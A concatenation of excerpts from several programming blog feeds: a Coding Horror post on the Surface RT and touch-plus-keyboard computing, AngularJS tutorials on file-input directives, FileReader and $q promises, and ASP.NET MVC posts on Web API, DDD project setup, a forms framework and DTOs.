featureless slate that invites you to touch it. <b>Welcome to the future, here's your … rectangle.</b></p><p><img  alt=\"tablets\" title=\"tablets\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee4a07595970d-800wi\" width=\"600\" height=\"436\" /></p><p>I've stopped thinking of touch as some exotic, add-in technology contained in specialized devices. I belatedly realized that <a href=\"http://www.youtube.com/watch?v=XELpxApT8Kc\">I love to touch computers</a>. And why not? We constantly point and gesture at everything in our lives, including our screens. It's completely natural to want to interact with computers by touching them. That's why the more unfortunate among us have <a href=\"http://www.codinghorror.com/blog/2008/05/cleaning-your-display-and-keyboard.html\">displays covered in filthy fingerprints</a>.</p><p>Although I love my touch devices, one thing I've noticed is that <b>they are a major disincentive to writing actual paragraphs</b>. On screen keyboards get the job done, but if I have to scrawl more than a Twitter length reply to someone on a tablet or phone, it's so much effort that I just avoid doing it altogether, postponing indefinitely until I can be in front of a keyboard. By the time that happens I've probably forgotten what I wanted to say in the first place, or that I even needed to reply at all. Multiply that by millions or billions, and you have a whole generation technologically locked into a backwater of minimal communication. Yelp, for example, does <a href=\"https://twitter.com/codinghorror/status/249912609439088640\">not allow posting reviews from their mobile app</a> because when they did, all they got was LOL OMG <i>raspberry</i> poop Emoji.</p><p><img alt=\"Omg-raspberry-poop\" title=\"Omg-raspberry-poop\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee4a06941970d-800wi\" width=\"326\" height=\"122\" /></p><p>It's not good. In fact, it's a little scary. I realize that there are plenty of ways of creating content that don't involve writing, but writing is <a href=\"http://www.codinghorror.com/blog/2011/02/how-to-write-without-writing.html\">pretty damn fundamental</a> to communication and civilization as we know it. Anything that adds a significant barrier to the act of placing words on a page is kind of dangerous – and a major regression from the world where every computer had a keyboard in front of it, inviting people to write and communicate with each other. So the idea that billions of people in the future will be staring at touchscreen computers, Instagramming and fingerpainting their thoughts to each other, leaves me with deeply mixed feelings. As Joey Hess <a href=\"http://joey.hess.usesthis.com/\">said</a>:<p><blockquote>If it doesn't have a keyboard, I feel that my thoughts are being forced out through a straw.</blockquote></p><p>When I pre-ordered the <a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\">Microsoft Surface RT</a>, I wasn't expecting much. This is a version one device from a company that has never built a computer before, running a <a href=\"http://www.codinghorror.com/blog/2012/07/betting-the-company-on-windows-8.html\">brand new and controversial operating system</a>. On paper, it doesn't seem like a significant change from all the other tablets on the market, and its primary differentiating feature – the touch keyboard – can be viewed as merely flipping a regular laptop over, so the \"fat\" side is on the display rather than the keyboard.</p><a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\"><img alt=\"Laptop vs. Surface\" title=\"Laptop vs. Surface\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2aadd6970c-800wi\" width=\"600\" height=\"239\" /></a></p><p>Surface is just like the first iPad in that it has all the flaws and rough edges you'd expect in a version one device. But it is also like the first iPad in that <b>there is undeniably the core of something revelatory and transformative here – a vision of the future of computing that <i>doesn't</i> sacrifice either keyboard or touch.</b></p><p>Reviewers think Surface is intended to be a tablet killer, but it isn't. It's a laptop killer. After living with the Surface RT for a few days now, I'm convinced that this form factor is the replacement and way forward for the stagnant laptop. I can't even remember the last time I was this excited about a computer. The more I use it, the more I think that touch plus keyboard is the future of all laptops.</p><p>How wonderful it is to flip open the Surface and quickly type a 4 paragraph email response when I need to. How wonderful it is to browse the web and touch whatever I want to. And switching between the two modes of interaction – sometimes typing, sometimes touching – is completely natural. Remember when I talked about <a href=\"http://www.codinghorror.com/blog/2008/03/revisiting-keyboard-vs-the-mouse-pt-1.html\">two-fisted computing</a>, referring to the mouse and keyboard working in harmony? With Surface, I found that also applies to touch. In spades.</p><p><a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\"><img alt=\"The Surface RT in my lap\" title=\"The Surface RT in my lap\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2b3765970c-800wi\" width=\"700\" height=\"525\" /></a></p><p>This isn't a review, per se, but let me get into a few specifics:<ul><li>Yes, it is ridiculous that the keyboard cover is not included in the base Surface, as the near-perfect integration of keyboard with touch is the whole story here. Don't even <i>consider</i> buying a Surface without the touch keyboard cover. Within an hour or so I was hitting 80% of my regular typing speed on it, and it's firm enough to be used on a lap without too much loss of accuracy. Astonishingly, the tiny fabric touchpad is quite good, better than the ones I've used on many laptops. Which probably says more about the sad state of the PC ecosystem than it does about Surface, but still.<li>Yeah, yeah, it doesn't run x86 apps. So your beloved copy of Windows Landscape Designer 1998 won't run on Surface RT. You'll need to wait a few months for Surface Pro to do that, but you'll pay the Intel Premium™ in price, battery life, and size. Rumor has it that Intel will get their act together with Haswell, and finally be competitive with ARM in price, performance, and power consumption, but I'll believe that when I see it.<li>The hardware design is beyond reproach; I'd even argue it's <i>better</i> than Apple quality hardware design. Unless you're required by God to hate all things touched by Microsoft, There's no way you could handle a Surface and not think that this is a genuinely well made <i>thing</i>.<li>The default Surface mail application is an embarrassment and everyone associated with it should be fired. Android and iOS both have decent default mail apps, as well they should, because email is bedrock. Not having this right really hurts. If Microsoft doesn't get their A Team \"hey dummies, all you have to do is just copy Sparrow already\" team on that soon, they'll be sorry.<li>Many of the native applications currently available run poorly on Surface RT due to lack of optimization and testing for the ARM platform versus x86. Probably not terribly different from the iPad 1 on launch day, but it remains to be seen how quickly that will get resolved.<li>The web browser is stellar and a model of how the Internet should work on a tablet. You are almost always in fullscreen mode, swiping around with nothing but content on your screen, the way it should be. However, back button performance is bizarrely slow, and the way IE10 handles web hovers is poor, much worse than Mobile Safari and Chrome. Try upvoting a comment on Stack Overflow to see what I mean.</ul></p><p>Notice how the 2010 iPad 1 is already obsolete? Expect the same thing with the <a href=\"http://www.microsoft.com/surface/en-US/surface-with-windows-rt/home\">Surface RT</a>. It's a fascinating glimpse into the future, but it'll be totally utterly obsolete in 2 years. Do not buy this device expecting longevity. Buy it because you want to see tomorrow today.</p><p>The received wisdom about touchscreen interaction with computers was that <a href=\"http://www.wired.com/gadgetlab/2010/10/gorilla-arm-multitouch/\">it didn't work</a>. That you'd get \"gorilla arm\". That's why we had to have special tablet devices. But <b>Surface proves that's not true; typing and touching are <i>spectacularly</i> compatible, at least for laptops.</b> And I'm beginning to wonder about my desktop a little, because lately I'm starting to I think I wanna touch that, too.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] How are you showing off your awesome?

Directives can manipulate the DOM, listen for events in the DOM, and move data between the  model and the view. For simple directives, most of the work is in the<em>link</em>function of the directive. Inside of link you’ll have access to your associated DOM element and the current scope. The DOM element is wrapped in<a href=\"http://docs.angularjs.org/api/angular.element\">jQuery lite</a>(unless you are using jQuery, then it will be wrapped with jQuery), so you can wire up events on the element, change its classes, set its text, its HTML, and so on.</p><p>In our fileInput directive, the most important DOM operation is to wire up the change event.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var fileInput = function ($parse) {return {restrict: \"EA\",template: \"&lt;input type='file' /&gt;\",replace: true,link: function (scope, element, attrs) {var modelGet = $parse(attrs.fileInput);var modelSet = modelGet.assign;var onChange = $parse(attrs.onChange);var updateModel = function () {scope.$apply(function () {modelSet(scope, element[0].files[0]);onChange(scope);});};element.bind('change', updateModel);}};};</pre><p>The rest of the code in the<em>link</em>function is moving a selected file into the model.  This directive assumes there will be a single file. The directive can also fire off an onChange expression set in the HTML. Most of this work is easy because the $parse service in Angular can essentially turn HTML attribute values into executable code.</p><p>Using the directive in markup is easy:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;div file-input=\"file\" on-change=\"readFile()\"&gt;&lt;/div&gt;&lt;img ng-src=\"{{imageSrc}}\"/&gt;</pre><p>The associated controller just needs to implement<em>readFile</em>for the code to all work.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.readFile = function () {fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};};</pre><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=2_g_FGSmqwA:JlP_c7rnqhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1035}}

Here is an Angular service that wraps the<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader\">FileReader</a>and transforms an evented API into a promise API. The<em>onload</em>event resolves a promise, and the<em>onerror</em>event rejects a promise. Notice the use of scope.$apply to propagate the promise results.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">(function (module) {var fileReader = function ($q, $log) {var onLoad = function(reader, deferred, scope) {return function () {scope.$apply(function () {deferred.resolve(reader.result);});};};var onError = function (reader, deferred, scope) {return function () {scope.$apply(function () {deferred.reject(reader.result);});};};var onProgress = function(reader, scope) {return function (event) {scope.$broadcast(\"fileProgress\",{total: event.total,loaded: event.loaded});};};var getReader = function(deferred, scope) {var reader = new FileReader();reader.onload = onLoad(reader, deferred, scope);reader.onerror = onError(reader, deferred, scope);reader.onprogress = onProgress(reader, scope);return reader;};var readAsDataURL = function (file, scope) {var deferred = $q.defer();var reader = getReader(deferred, scope);reader.readAsDataURL(file);return deferred.promise;};return {readAsDataUrl: readAsDataURL};};module.factory(\"fileReader\",[\"$q\", \"$log\", fileReader]);}(angular.module(\"testApp\")));</pre><p>The service only exposes a single method (<em>readAsDataUrl</em>). The rest of the FileReader methods are omitted for brevity, but they follow the same pattern.</p><p>One interesting event is the<em>onprogress</em>event of a FileReader. Since there is nothing to do with the promise during a progress event, the event is instead transformed and forwarded using<em>scope.$broadcast</em>. Other interested parties can use<em>$scope.$on</em>to register event handlers for such broadcasts. For example, here is a controller  using the reader the reader service.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var UploadController = function ($scope, fileReader) {$scope.getFile = function () {$scope.progress = 0;fileReader.readAsDataUrl($scope.file, $scope).then(function(result) {$scope.imageSrc = result;});};$scope.$on(\"fileProgress\", function(e, progress) {$scope.progress = progress.loaded / progress.total;});};</pre><p>The progress value is fed into a progress element:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;progress value=\"{{progress}}\"&gt;&lt;/progress&gt;</pre><p>But how does a controller know what file to read?</p><p>That’s where we can build some file input and drag and drop directives...</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=XLrz9B_AfzE:PpuPyUB7Z-M:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1036}}

Why not use a FileReader directly from the code in a model or controller?</p><p>Here are two reasons:</p><p>1) To build an adapter around FileReader that works with promises instead of call back functions (which is what this post will focus on).</p><p>2) To achieve greater flexibility. Services in AngularJS can be decorated or replaced at runtime.</p><p>To understand the advantages of #1, we’ll need to learn about promises in AngularJS. For more general information about promises, see“<a href=\"http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/\" target=\"_blank\">What’s so great about JavaScript Promises</a>”.</p><h3>Promises and $q</h3><p>In Angular, $q is the well known name of a promise provider, meaning you can use $q to create new promises. Here’s some code for a simple service that will perform async operations. The service requires $q as a dependency.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">(function(module) {var slowService = function ($q) {var doWork = function () {var deferred = $q.defer();// asynch work will go herereturn deferred.promise;};return {doWork: doWork};};module.factory(\"slowService\",[\"$q\", slowService]);}(angular.module(\"testApp\")));</pre><p>The<em>doWork</em>function uses<em>$q.defer</em>to create a a deferred object that represents the outstanding work for the service to complete. The function returns the deferred object’s<em>promise</em>property, which will give the caller an API for figuring out when the work is complete. This is the basic pattern most async services will use, but in order for anything interesting to happen with the promise, the service will also need to resolve or reject the promise when the async work is complete. Here is a new version of the<em>doWork</em>function .</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var doWork = function (value, scope) {var deferred = $q.defer();setTimeout(function() {scope.$apply(function() {if (value === \"bad\") {deferred.reject(\"Bad call\");} else {deferred.resolve(value);}});}, 2000);return deferred.promise;};</pre><p>This version is using<em>setTimeout</em>to simulate work that takes 2000 milliseconds to complete. Normally you’d want to use the Angular $timeout service instead of setTimeout, but setTimeout is here to illustrate an important point.</p><p><strong>AngularJS promises do not propagate the result of a completed promise until the next digest cycle</strong>.</p><p>This means there has to be a call to<em>scope.$apply</em>(which will kick off a digest cycle) for the promise holder to have their callback functions invoked. With the $timeout service we wouldn’t need to use<em>$scope.apply</em>ourselves since the $timeout service will call into our code using<em>$apply</em>, but most things you’ll wrap with a service are not Angularized, so you’ll need to use<em>$apply</em>when resolving a promise.</p><h3>Promises From The Client Perspective</h3><p>Promises can lead to readable code for the client, as the code in the bottom of the controller demonstrates.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var callComplete = function (result) {$scope.serviceResult = result;};var callFailed = function(reason) {$scope.serviceResult = \"Failed: \" + reason;};var logCall = function() {$log.log(\"Service call completed\");};$scope.serviceResult = \"\";slowService.doWork(\"Hello!\", $scope).then(callComplete, callFailed).always(logCall);};</pre><p>One interesting feature of AngularJS is how the data-binding infrastructure understands how to work with promises. If all you want to do is assign the resolved value to a variable for data-binding, then you can assign the variable a promise instead of using a callback and Angular will know how to pick up the resolved value and update the view.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">$scope.serviceResult =slowService.doWork(\"Hello!\", $scope).always(logCall);</pre><p>And of course chained promises can kick off new async operations and the runtime will work through the promises in a serial fashion.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var TestController = function($scope, $log, slowService) {var saveResult = function (result) {$scope.callResults.push(result);};$scope.callResults = [];slowService.doWork(\"Hello\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult);};</pre><p>With the above code and this bit of markup:</p><pre class=\"brush: xml; gutter: false; toolbar: false;\">&lt;li ng-repeat=\"result in callResults\"&gt;{{ result }}&lt;/li&gt;</pre><p>... then“World” appears on the screen roughly 2 seconds after“Hello”.</p><p>It’s interesting to note in the last example that if the first call fails, the 2nd call never happens (because the 2nd call is started from an“on success” function). If you want to know that the call failed you don’t have to add an error callback to every<em>.then</em>invocation.  A rejected promise will tunnel it’s way through the rest of the chain invoking error call backs as it goes, meaning you could get away with an error callback in the final .<em>then</em>.</p><p>For example, the following chained operations are doomed to failure since the service will reject the initial call with a parameter of“bad”.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">slowService.doWork(\"bad\", $scope).then(saveResult).then(function() {return slowService.doWork(\"World\", $scope);}).then(saveResult, logFailure);</pre><p>Even though the error handler<em>logFailure</em>doesn’t appear till the end of the chain, the initial failed service call will find it and the 2nd service is skipped.</p><p>In addition to serial processing, you can kick off multiple promises and wait for them to complete using $q.all.</p><pre class=\"brush: js; gutter: false; toolbar: false;\">var promises = [];var parameters = [\"Hello\", \"World\", \"Final Call\"];angular.forEach(parameters, function(parameter) {var promise = slowService.doWork(parameter, $scope).then(saveResult);promises.push(promise);});$q.all(promises).then(function() {$scope.message = \"All calls complete!\";});</pre><p>Now that we know a little more about promises, we can move on to the business of building a service in the next post.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/OdeToCode?a=iNMHRkSs5u8:UV2GmjRX2d0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/OdeToCode?d=yIl2AUoC8zA\" border=\"0\"></img></a></div>","author":"scott@OdeTocode.com","_id":{"$wrap":"$oid","v":1037}}

Do they work together? Should they work together? When should you use one or the other?</p><p>Here’s some general rules of thumb I use.</p><p><strong>1.</strong>If the bulk of the application is generating HTML on the server, then there is no need to use the Web API. Even if I have the occasional call from JavaScript to get JSON data for templates or an autocomplete widget, using regular MVC controllers will suffice.</p><p><img title=\"Figure 1\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"All ASP.NET MVC\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure1_3.png\" width=\"229\" height=\"207\"></p><p>One thing to keep in mind is that the Web API is a separate framework with its own dependency resolver, action filters, routing rules, model binding, and model serialization settings. Bringing in a 2nd set of all these components just to satisfy a few JSON requests from script is an increase in complexity.</p><p><strong>2.</strong>If an application is loaded with JavaScripts and JSON flows back and forth to the server frequently, or if I have to support more clients than just the script in the pages from my site (some of whom might want XML or other formats), then it is a good time to create HTTP service endpoints and a more formal service API. These scenarios are just what Web API is made for and both MVC controllers and Web API controllers will happily coexist in the same project.</p><p><img title=\"Figure 2\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"MVC With Web API\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure2_3.png\" width=\"391\" height=\"213\"></p><p>Although the Web API does add some complexity, it is also easier to build a proper service with the Web API. I can use the verb based routing and content negotiation features to build services oriented around resources, and the OData support and automatic help page generation of the Web API framework can come in handy.</p><p><strong>3</strong>. I’m not a big fan of services for services sake. In the previous two figures, the MVC UI and Web API pieces are drawn to suggest how they are only facades on top of a core application. Most of the interesting things are defined in the application and not in the UI and Web API layers. When someone suggests that the MVC controllers should talk over HTTP to Web API controllers in the same application, all I can think about is putting a façade over a façade, which seems silly.</p><p> </p><p><img title=\"Figure 3\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Tears for tiers\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure3_3.png\" width=\"352\" height=\"278\"></p><p>There are some valid reasons to go with such an architecture (see #4), but be cautious when creating new tiers.</p><p><strong>4</strong>. It is more than reasonable to integrate multiple applications or large pieces of functionality using services and the Web API. This is a scenario where having web service calls inside or behind the MVC controllers of an application is almost required.</p><p><img title=\"Figure 4\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; border-left: 0px; display: block; padding-right: 0px; margin-right: auto\" border=\"0\" alt=\"Big Enterprise\" src=\"http://odetocode.com/images2/Windows-Live-Writer/ASP.NET-MVC-and-WebAPI_117BD/figure4_3.png\" width=\"627\" height=\"368\"></p><p>The above type of scenario usually involves large applications and multiple teams. Using a service layer allows for more flexibility and scale compared to sharing binaries, or integrating at the database level (shudder with fear).</p><h3>Parting Words</h3><p>There is no quick and easy answer to the questions in this space. If you are looking for guidance, hopefully I’ve provided some rules of thumb you can use to start thinking about the answer for your specific scenario.

These problems include the general ineptitude of the view engines with which traditional ASP development and even<a href=\"http://www.w3schools.com/aspnet/aspnet_forms.asp\">webforms</a>development were driven.</span></span></p><p><span style=\"WIDOWS: 2; TEXT-TRANSFORM: none; TEXT-INDENT: 0px; BORDER-COLLAPSE: separate; FONT: 16px\"Times New Roman\"; WHITE-SPACE: normal; ORPHANS: 2; LETTER-SPACING: normal; COLOR: rgb(0,0,0); WORD-SPACING: 0px; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; -webkit-text-decorations-in-effect: none; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px\" class=\"Apple-style-span\"><span style=\"FONT-FAMILY: Arial; WHITE-SPACE: pre-wrap; COLOR: rgb(64,64,64); FONT-SIZE: 12px\" class=\"Apple-style-span\">ASP.NET MVC is the clear answer to seperation of concerns that webforms attempted to give us with the code-behind files.

href=\"http://www.castleproject.org/dynamicproxy/index.html\">Castle's DynamicProxy</a>.  DyanmicProxy generates inheritance based proxies; therefore, it can only work if members are marked as virtual so that it can override them.  There are other proxy choices; however, I will not be covering them.  Making members virtual is a small price to pay for the conveniance in my opinion.</p><h3>Mapping

Unzip the entire contents into<strong>trunk/tools/nunit</strong>.  It is important that you include the full NHibernate distribution with your project so when we add an automated build tool later it will be able to run the unit tests without assuming that every developer has installed the correct version of NUnit from msi.</p><p>4) Download Moq from<a href=\"http://code.google.com/p/moq/downloads/list\">http://code.google.com/p/moq/downloads/list</a>.  Put the binaries in<strong>trunk/libraries/moq</strong>.</p><p>5) Download MVCContrib from<a href=\"http://www.codeplex.com/MVCContrib\">http://www.codeplex.com/MVCContrib</a>.  Put the binaries in<strong>trunk/libraries/mvccontrib</strong>.</p><p>As an added measure of safety against change, I like to reference the MVC libraries themselves from binaries I store in my svn repository instead of from source.  You don't have to do this, but if you choose to, I put System.Web.Mvc, System.Web.Routing, and System.Web.Abstractions in<strong>trunk/libraries/mvc</strong>.</p><p>Your completed project structure should look like this:</p><p><img height=\"248\" alt=\"\" width=\"184\" src=\"/images/nathan_whiteboard-it_com/DDDSample/ProjectStructure.png\" /></p><h3>Creating the Projects</h3><p>Our mvc project and class libraries will go in trunk/src.</p><p>Create an asp.net MVC project.  For this sample, I'm calling mine Blog.Web.</p><p>Create two class libraries: Blog.Domain and Blog.Service.  Blog.Domain is where our POCO (Plain Old C# Objects) entities and our repository interfaces will reside.  Blog.Service is where the business logic that ties the application together will live.</p><p>Reference Blog.Domain and Blog.Service from Blog.Web.  Reference Blog.Domain from Blog.Service.</p><p>Create a new solution folder (right click on project, hover over add, choose new solution folder) called Test.  This is where our test projects will go.</p><p>Create three class libraries: Blog.Web.Test, Blog.Domain.Test, and Blog.Service.Test.  In each of these projects reference NUnit.Framework from /trunk/tools/nunit.</p><p>More test projects may be needed later for separating unit tests from integration tests, but this is how I like to start with one unit test project for each of my projects.</p><p>The solution should now look like this:</p><p><img height=\"146\" alt=\"\" width=\"202\" src=\"/images/nathan_whiteboard-it_com/DDDSample/SolutionStructure.png\" /></p><h3>Entity Base Class</h3><p>In the domain, create an object ot be the base class for entities.  An entity is an object that has an identity.</p><div style=\"FONT-WEIGHT: bold;

I leave this post here as a reference.  Also, if you wish to have a more Django style forms framework, this would be a great starting point.  The code is freely available for anyone who wishes to use it.</span><br /><br />One thing that is notably missing from ASP.NET MVC is a good way to handle forms and their validation.  To resolve this issue, I started on a simple forms framework this weekend.<br /><h3>The end goal</h3><img height=\"193\" width=\"392\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactAction.jpg\" alt=\"\" /><br /><br />I don't particularly like the action filter to handle the insertion of the model as a parameter.  I would prefer it be done via windsor and interceptors; however, for the first go round I have decided to keep the castle stack out of this.  The technique could easily be adapted to use MVC Contrib's WindsorControllerFactory and interceptors so that attributes do not have to be on every action you wish to use a form helper with.  More on that later.<br /><br />For those of you who want to skip the reading and get straight to the code,<a href=\"http://nathan.whiteboard-it.com/SampleCode/WB.Forms.zip\">download the sample project</a>.  Look at the /Home/Contact page.<span style=\"font-weight: bold;\">Note</span>: the sample project depends on<a href=\"http://www.codeplex.com/aspnet/Release/ProjectReleases.aspx?ReleaseId=15389\">MVC Preview 4</a>.<br /><h3>The Components</h3><ul><li>Field - A field is the smallest unit of input and validation in a form.</li><li>Widget - A widget is an abstraction of HTML template text for input.</li><li>FormBase - Base class for form helpers.</li><li>ModelForm - A form auto created from a POCO model.</li></ul><h3>Widget</h3>A widget has a name, a value, and some attributes.  The name and value properties are by default shortcuts to the name and value attributes of the widget's attribute collection.  However, this behavior is overridable in subclasses.  A widget also has a way of rendering itself as XHTML.<br /><h3>Field</h3>A field has a name, a value, and a widget.  By default a field is required, and it has a publicly exposed validate method so that it can be asked to validate its value.  It also has the ability to output itself as XHTML.<br /><h3>FormBase</h3>FormBase, the base class for forms contains a collection of fields, a method to validate the fields, and a method to load the values of fields from a name value collection.  The latter facilitates the loading of data from a browser request.<br /><br />The first concrete implementation of FormBase I created was ModelForm.  A ModelForm accepts a generic type argument and in its constructor takes an object of that type.  It uses this object to generate fields for the form.  The generation logic is implemented using the strategy pattern so that it is easily customizable.<br /><br />Here is the strategy interface<br /><br /><img height=\"128\" width=\"342\" src=\"/images/nathan_whiteboard-it_com/FormFramework/IFieldStrategy.jpg\" alt=\"\" /><br /><br />The ModelForm registers default strategies<br /><br /><img height=\"173\" width=\"426\" src=\"/images/nathan_whiteboard-it_com/FormFramework/RegisterStrategies.jpg\" alt=\"\" /><br /><br />The constructor allows you to pass in your own strategies<br /><br /><img height=\"278\" width=\"698\" src=\"/images/nathan_whiteboard-it_com/FormFramework/StrategyCtor.jpg\" alt=\"\" /><br /><br />With that, we have everything we need to make a form from a POCO.<br /><br /><h3>Model Action Filter</h3>One of the neatest things ASP.NET MVC does is allow you to make controllers with parameters that will be filled in from the request.<br /><br />I wanted to be able to do this with my form classes as well.<br /><br />For the first go round, I decided not to use what I would prefer: Windsor and IInterceptors.  Instead I integrated the MVC way by using their action filters.<br /><br />The filters give us everything we need to set the values for a parameter.  We have access to the parameters through the ActionMethod.GetParmaeters() method and we can set the parameters via the ActionParameters dictionary.<br /><br />Here is the action filter<br /><br /><img height=\"321\" width=\"700\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ModelFilterAttribute.jpg\" alt=\"\" /><br /><br />FormFactory is a simple helper class that uses a strategy pattern to create forms based upon the type passed in and a NameValueCollection.<br /><br />Settings filterContext.Action<br /><br />Now, this action will work!<br /><br /><img height=\"193\" width=\"392\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactAction.jpg\" alt=\"\" /><br /><br /><h3>Rendering the Form in a View<br /></h3>I provided three canonical methods for rendering the form:<br /><br />AsDiv - renders the form with each field wrapped in a div<br />AsTable - render the form with each field as a table row<br />AsList - render the form with each field as a list item of an unordered list<br /><br />I also provided a AsCustom method that allows you to specify an XElement to wrap the form fields inside of and an XElement to use as the parent for the children generated by the field instances.<br /><br />If you want even more flexibility, the rendering is completely overridable by subclassing.<br /><br />Rendering the form is as simple as passing it to a view and calling AsDiv() or your preferred alternative.<br /><br />All output is valid XHTML.  Invalid fields receive an error class.<br /><br />Rendered<br /><img height=\"309\" width=\"377\" alt=\"\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactForm.jpg\" /><br /><br />Validation<br /><img height=\"276\" width=\"468\" alt=\"\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactFormValidation.jpg\" /><br /><br /><a href=\"http://nathan.whiteboard-it.com/SampleCode/WB.Forms.zip\">Download the Sample Project</a><br /><span style=\"font-weight: bold;\">Note</span>: the sample project depends on<a href=\"http://www.codeplex.com/aspnet/Release/ProjectReleases.aspx?ReleaseId=15389\">MVC Preview 4</a>.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f10%2fmvc-forms-framework-with-validation.aspx\"><img border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f10%2fmvc-forms-framework-with-validation.aspx\" alt=\"kick it on DotNetKicks.com\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/10.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=sZU7VkEq\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=jjakbosZ\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=I0WZT94m\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/I8jboFoNwT4\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1046}}

but this is what makes them the one object that is safe to pass across a service boundary.  A client that interacts with your service may, and often will, have a different domain from the service itself.  In fact, many different clients with many different domains may interact with your service.  It is difficult and undesirable to share the same domain model between a service and all its potential clients.<br /><br />Consider again the Company example.  Let us assume that the service we are writing is a better business bureau catalog of companies.  The domain object, Company, may include such methods as \"FileComplaint\" or \"RevokeLicense.\"<br /><br />This service may be consumed by an auction site that wants to use the companies names and ratings but has no need to file complaints and does not have the ability to revoke a license.  The company domain object for the auction site will include methods such as \"AddAuction\" or \"AssociateWithReview.\"<br /><br />Sharing the domain objects between the auction site and the better business bureau service would pollute both domains; not to mention the fact that they may, and in this example certainly would, have different owners who do not wish to share code bases.<br /><br />Sharing DTOs, because of their lack of behavior, works fine though.  The DTOs serve as a simple, abstracted definition for the data that the service and its clients must exchange.<br /><br /><img height=\"262\" width=\"611\" src=\"/images/nathan_whiteboard-it_com/DTO Pattern/BBBExample(1).jpg\" alt=\"\" /><br /><br />DTOs also insulate your service clients from changes to the domain of the service and vice versa.  You are free to change your domain objects as much as you want and leave the DTOs alone.  The assembler can simply be updated as the domain objects are updated.<br /><br />If the domain objects were shared by the clients, every change to a domain object would directly impact clients, greatly increasing the costs of maintaining the service.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f23%2fdata-transfer-objects.aspx\"><img border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f23%2fdata-transfer-objects.aspx\" alt=\"kick it on DotNetKicks.com\" /></a><img 